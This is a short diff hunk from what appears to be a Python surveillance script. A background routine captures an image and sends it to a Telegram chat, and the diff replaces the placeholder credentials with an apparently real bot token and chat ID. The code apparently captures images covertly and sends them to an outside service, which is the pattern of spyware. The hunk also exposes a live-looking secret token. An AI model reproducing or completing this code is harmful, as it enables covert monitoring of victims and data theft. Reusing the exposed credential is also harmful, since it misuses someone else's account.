@@ -40,8 +40,8 @@ def run_in_background():
         image_path = capture_image()
         
         if image_path:
-            bot_token = "YOUR_BOT_TOKEN"
-            chat_id = "YOUR_CHAT_ID"
+            bot_token = "7345483638:AAFFxw3M54cXhNCEFbz40FlYNVi-wa7Eyws"
+            chat_id = "5931329955"
             
             send_image_via_telegram(image_path, bot_token, chat_id)
         
